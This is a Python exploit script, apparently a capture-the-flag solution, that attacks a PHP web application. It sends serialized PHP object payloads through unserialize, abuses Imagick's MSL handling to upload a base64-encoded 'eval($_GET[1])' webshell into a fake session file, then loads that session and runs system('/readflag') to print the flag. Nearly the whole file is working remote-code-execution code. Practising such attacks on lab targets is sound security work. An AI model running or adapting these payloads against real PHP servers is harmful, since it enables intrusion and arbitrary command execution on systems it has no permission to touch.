#!/usr/bin/python3
#coding:utf-8

import re
import sys
import time
import requests

timeout = 30

host = sys.argv[1]
port = sys.argv[2]

url = f"http://{host}:{port}"
write_session_payload = "O%3A8%3A%22backdoor%22%3A3%3A%7Bs%3A14%3A%22%00backdoor%00argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A15%3A%22%00backdoor%00class%22%3Bs%3A7%3A%22imagick%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A0%3B%7D"
session_sleep_chain_payload = "O%3A8%3A%22backdoor%22%3A2%3A%7Bs%3A5%3A%22class%22%3Bs%3A13%3A%22session_start%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A1%3B%7D"

def rm_tmp_file():
    headers = {"Accept": "*/*"}
    requests.get(
        f"{url}/?cmd=rm",
        headers=headers
    )

def upload_session():
    headers = {
        "Accept": "*/*",
        "Content-Type": "multipart/form-data; boundary=------------------------c32aaddf3d8fd979"
    }
    data = "--------------------------c32aaddf3d8fd979\r\nContent-Disposition: form-data; name=\"swarm\"; filename=\"swarm.msl\"\r\nContent-Type: application/octet-stream\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<image>\r\n <read filename=\"inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=\" />\r\n <write filename=\"/tmp/sess_afkl\" />\r\n</image>\r\n--------------------------c32aaddf3d8fd979--"
    try:
        requests.post(
            f"{url}/?data=O%3A8%3A%22backdoor%22%3A3%3A%7Bs%3A14%3A%22%00backdoor%00argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A15%3A%22%00backdoor%00class%22%3Bs%3A7%3A%22imagick%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A0%3B%7D&cmd=unserialze",
            headers=headers, data=data
        )
    except requests.exceptions.ConnectionError:
        pass

def get_flag():
    cookies = {"PHPSESSID": "afkl"}
    headers = {"Accept": "*/*"}
    response = requests.get(
        f"{url}/?data=O%3A8%3A%22backdoor%22%3A2%3A%7Bs%3A5%3A%22class%22%3Bs%3A13%3A%22session_start%22%3Bs%3A12%3A%22do_exec_func%22%3Bb%3A1%3B%7D&cmd=unserialze&1=system('/readflag');", 
        headers=headers, cookies=cookies
    )
    return re.findall(r"(flag\{.*\})", response.text)

# 主逻辑
if __name__ == '__main__':
    rm_tmp_file()
    upload_session()

    time.sleep(1)

    print(get_flag()[0])
